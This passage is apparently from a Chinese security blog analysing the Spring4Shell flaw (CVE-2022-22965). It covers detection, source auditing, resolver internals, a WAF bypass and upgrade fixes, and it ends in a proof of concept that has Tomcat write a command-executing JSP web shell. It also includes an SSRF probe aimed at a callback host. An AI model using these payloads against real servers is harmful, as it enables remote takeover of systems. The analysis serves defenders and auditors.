src="/2022/04/06/CVE-2022-22965/1.png"><br>当<code>class.module.classLoader.resources.context.mapperDirectoryRedirectEnabled=true</code>：<br><img src="/2022/04/06/CVE-2022-22965/2.png"></p><h4 id="通过SSRF"><a href="#通过SSRF" class="headerlink" title="通过SSRF"></a>通过SSRF</h4><p>不推荐使用，如果应用使用了<code>configFile</code>会破坏运行环境：</p><pre class="line-numbers language-none"><code class="language-none">class.module.classLoader.resources.context.configFile&#x3D;https:&#x2F;&#x2F;&#123;&#123;interactsh-url&#125;&#125;&amp;class.module.classLoader.resources.context.configFile.content.aaa&#x3D;xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h3><h4 id="使用-RequestBody"><a href="#使用-RequestBody" class="headerlink" title="使用@RequestBody"></a>使用@RequestBody</h4><p>先检查项目中使用POJO的接口，然后再检查是否使用了<code>@RequestBody</code>注解。使用<code>@RequestBody</code>注解的接口是接收JSON和XML等请求，底层使用<code>RequestResponseBodyMethodProcessor</code>处理请求，而Content-Type是<code>application/x-www-form-urlencoded</code>的时候，会使用<code>ServletModelAttributeMethodProcessor</code>解析请求。所以使用<code>@RequestBody</code>的时候不存在漏洞，可以使用egrep初步匹配之后，排查没有使用<code>@RequestBody</code>的接口:</p><pre class="line-numbers language-none"><code class="language-none">egrep -5  -ri &quot;@(Get|Post|Put|Delete|Patch|Request)Mapping&quot; .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在使用<code>@RequestBody</code>的时候，如果自定义了<a href="https://blog.csdn.net/justry_deng/article/details/99875548">参数解析器</a>，也就是说后端可以同时接收<code>application/json</code>和<code>application/x-www-form-urlencoded</code>这两种请求，也可能存在漏洞。在测试JSON接口的时候可以改变Content-Type为<code>application/x-www-form-urlencoded</code>做一次尝试。</p><p>SpringMVC的<code>HandlerMethodArgumentResolver</code>是方法参数解析器接口，这个接口是SpringMVC参数解析绑定的核心接口，内置了很多类完成<a href="https://github.com/spring-projects/spring-framework/blob/d84ca2ba90d27a7c63d7b35a6259b5b9cf341118/spring-webmvc/src/main/java/org/springframework/web/servlet/mvc/method/annotation/RequestMappingHandlerAdapter.java#L644">参数解析</a>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerMethodArgumentResolver</span><span class="token punctuation">></span></span> <span class="token function">getDefaultArgumentResolvers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerMethodArgumentResolver</span><span class="token punctuation">></span></span> resolvers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Annotation-based argument resolution</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestParamMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestParamMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PathVariableMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PathVariableMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MatrixVariableMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MatrixVariableMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletModelAttributeMethodProcessor</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestResponseBodyMethodProcessor</span><span class="token punctuation">(</span><span class="token function">getMessageConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponseBodyAdvice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestPartMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getMessageConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponseBodyAdvice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestHeaderMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestHeaderMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletCookieValueMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ExpressionValueMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SessionAttributeMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestAttributeMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Type-based argument resolution</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletRequestMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletResponseMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HttpEntityMethodProcessor</span><span class="token punctuation">(</span><span class="token function">getMessageConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponseBodyAdvice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RedirectAttributesMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ModelMethodProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MapMethodProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ErrorsMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SessionStatusMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UriComponentsBuilderMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">KotlinDetector</span><span class="token punctuation">.</span><span class="token function">isKotlinPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ContinuationHandlerMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>比如:</p><ul><li><code>RequestParamMethodArgumentResolver</code>：   负责解析 @RequestParam 标记的参数</li><li><code>ServletRequestMethodArgumentResolver</code>： 负责解析入参为 HttpServletRequest、HttpMethod 等类型的参数</li><li><code>ServletModelAttributeMethodProcessor</code>： 负责解析入参为 POJO 类的参数</li><li><code>RequestResponseBodyMethodProcessor</code>：   负责解析入参为 @RequestBody 标注的参数</li></ul><h4 id="使用consumes的时候"><a href="#使用consumes的时候" class="headerlink" title="使用consumes的时候"></a>使用consumes的时候</h4><p><code>@RequestMapping(value = &quot;/rapid7/v1&quot;, method = &#123;RequestMethod.GET, RequestMethod.POST&#125;, consumes = &quot;application/json&quot;)</code><br>经过测试，未触发漏洞</p><h4 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h4><p>来自<a href="https://mp.weixin.qq.com/s/plFLE8e0-Fc2tHJ4HaiSSw">烽火台实验室的绕过</a>：</p><pre class="line-numbers language-none"><code class="language-none">class.module.classLoader.resources.context.resources.context.parent.pipeline.first.pattern<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级Spring Framework到v5.3.18或v5.2.20</p><p>Spring升级之后Tomcat也发布了新版本，在<code>Tomcat 9.0.62</code>版本对<code>getResources()</code>方法的返回值做了修改，直接返回null。<code>WebappClassLoaderBase</code>即<code>ParallelWebappClassLoader</code>的父类，在Web应用部署方式中，利用<code>org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</code>的链路就走不通了。<br><img src="/2022/04/06/CVE-2022-22965/9.png"></p><p>其它中间件的部分环境变量可以参考<a href="https://github.com/julianvilas/rooted2k15/blob/a00055f906/struts-tester/results/struts2-tomcat8-debug.txt">struts-tester</a></p><p><a href="https://www.anquanke.com/post/id/267124">RWCTF 4th Desperate Cat Writeup</a>的实际案例的利用原理也差不多，但是更有趣。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://tttang.com/archive/1532/">从零开始，分析Spring Framework RCE</a></li><li><a href="https://mp.weixin.qq.com/s/plFLE8e0-Fc2tHJ4HaiSSw">关于Spring framework rce（CVE-2022-22965）的一些问题思考</a></li><li><a href="https://mp.weixin.qq.com/s/G1z7mydl4nc9SxcZjwUQwg">CVE-2022-22965 Spring核心框架Spring4Shell远程命令执行漏洞原理与修复方式分析</a></li><li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/6020f5f7e74135970bc283317cc303fc6597b1e5/cves/2022/CVE-2022-22965.yaml">nuclei-templates</a></li><li><a href="https://xz.aliyun.com/t/11129">Spring Beans RCE分析</a></li><li><a href="https://www.anquanke.com/post/id/267124">RWCTF 4th Desperate Cat Writeup</a></li><li><a href="https://mp.weixin.qq.com/s/bG3BCdM-suCZldN7FIpYqw">Spring 参数绑定的分析以及甲方自查</a></li><li><a href="https://d3fence.com/spring4shell-CVE-2022-22965-e2bdda3a816a4e5480a0bbcaabda2f8d">spring4shell（CVE-2022-22965）事件考古资料梳理</a></li><li><a href="https://juejin.cn/post/6894026079116197896">SpringMVC 入参解析原理和实战</a></li><li><a href="https://www.cnblogs.com/w-y-c-m/p/8443892.html">SpringMVC源码之参数解析绑定原理</a></li><li><a href="https://www.aqniu.com/industry/82365.html">Spring远程命令执行漏洞（CVE-2022-22965）原理分析和思考</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞时间线&quot;&gt;&lt;a href=&quot;#漏洞时间线&quot; class=&quot;headerlink&quot; title=&quot;漏洞时间线&quot;&gt;&lt;/a&gt;漏洞时间线&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;CVE-2010-1622 Spring第一次&lt;a href=&quot;https://www.inbreak.net/archives/377&quot;&gt;爆发漏洞&lt;/a&gt;，同时也影响了Struts(&lt;a href=&quot;https://su18.org/post/struts2-2/#s2-020s2-021s2-022&quot;&gt;S2-020/S2-021/S2-022&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;2017年9月10日 Oracle官方发文解释Java 9的module新特性&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;2022年3月29日 蚂蚁集团报告漏洞（CVE-2022-22965）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;POC&quot;&gt;&lt;a href=&quot;#POC&quot; class=&quot;headerlink&quot; title=&quot;POC&quot;&gt;&lt;/a&gt;POC&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;CVE-2010-1622/Struts(&lt;a href=&quot;https://su18.org/post/struts2-2/#s2-020s2-021s2-022&quot;&gt;S2-020/S2-021/S2-022&lt;/a&gt;)&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;directory&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;webapps&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;ROOT
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;prefix&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;shell
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;suffix&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;jsp
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;fileDateFormat&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pattern&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bc2&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;j&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;pwd&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;InputStream&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;in&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bc1&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;cmd&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;int&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;a&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;byte&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;b&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;new&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;byte&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;B2048&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;in&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bsuffix&lt;span class=&quot;token 